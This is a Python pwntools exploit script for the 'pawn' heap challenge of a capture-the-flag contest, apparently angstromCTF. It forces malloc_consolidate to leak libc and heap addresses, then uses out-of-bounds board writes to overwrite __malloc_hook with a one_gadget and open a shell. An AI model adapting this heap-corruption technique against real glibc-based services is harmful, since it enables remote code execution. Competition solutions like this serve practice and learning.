#!/usr/bin/python3

from pwn import *
import sys

l = ELF('./libc.so.6')

if len(sys.argv) > 1:
    r = remote('shell.actf.co', 21706)
else:
    r = process('./pawn')

def add(idx):
    r.sendlineafter('5) Delete Board', '1')
    r.sendlineafter('What is the board index?', f'{idx}')

def print_b(idx):
    r.sendlineafter('5) Delete Board', '2')
    r.sendlineafter('What is the board index?', f'{idx}')

def move(idx, x, y, dx, dy):
    r.sendlineafter('5) Delete Board', '3')
    r.sendlineafter('What is the board index?', f'{idx}')
    r.sendlineafter('Please provide the x and y values of the piece, separated by spaces.\n', f'{x} {y}')
    r.sendlineafter('Please provide the x and y values of the position to move to, separated by spaces.\n', f'{dx} {dy}')
    global current_t
    current_t += 1

def smite(idx, x, y):
    r.sendlineafter('5) Delete Board', '4')
    r.sendlineafter('What is the board index?', f'{idx}')
    r.sendlineafter('Please provide the x and y values of the piece, separated by spaces.\n', f'{x} {y}')

def delete_b(idx):
    r.sendlineafter('5) Delete Board', '5')
    r.sendlineafter('What is the board index?', f'{idx}')

current_t = 0
x, y = 5, 7 
def set_t(val, idx):
    global x, y, current_t

    if x == 5 and y == 7:
        nx, ny = 6, 6
    else:
        nx, ny = 5, 7

    if val == current_t:
        return
    elif val > current_t:
        for i in range(val-current_t):
            move(idx, x, y, nx, ny)
            x, y, nx, ny = nx, ny, x, y
    else:
        diff = (0x100 - current_t) + val
        for i in range(diff):
            move(idx, x, y, nx, ny)
            x, y, nx, ny = nx, ny, x, y
    current_t = val

for i in range(4):
    add(i)
for i in range(3, -1, -1):
    delete_b(i)

# first charbuf length is 1024 (0x400)
# if over the buffer length, libc_scratch_buffer_grow_preserve extends it with twice length (0x800)
# when malloc(0x800), because 0x800 is large chunk size, it will trigger malloc_consolidate to merge fastbin chunk
r.sendlineafter('5) Delete Board', '0'*0x400)

print_b(0)
r.recvuntil('0 ')
libc = u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0x1ebc10

print_b(2)
r.recvuntil('0 ')
heap = u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0x1490

info(f"""
libc = {hex(libc)}
heap = {hex(heap)}
""")

for i in range(4):
    add(i)

ogs = [0xe6c7e, 0xe6c81, 0xe6c84]

# 0x17fe440 --> 0x17fe490
delete_b(2)
# 0x17fe300 --> 0x17fe350
delete_b(0)
# 0x17fe3a0 --> 0x17fe3f0
delete_b(1)

move(3, 6, 6, 6, 5) # move p in b3

set_t(0xa0, 3)
smite(0, -0x50, 0)

add(0) # chunk ptr
add(1) # string

_malloc_hook = libc + l.sym['__malloc_hook']
for i in range(0x8):
    c = (_malloc_hook >> i*8) & 0xff
    set_t(c, 3)
    smite(1, i+0x50, 0)

diff = heap + 0x13f0 - 0x404070 # chunk - starting
one = ogs[1] + libc
info(f"diff = {hex(diff)}")
for i in range(0x8):
    c = (one >> i*8) & 0xff
    set_t(c, 3)
    smite(1, -1*diff + i, 0)

add(3)
add(4) # get shell

r.interactive()
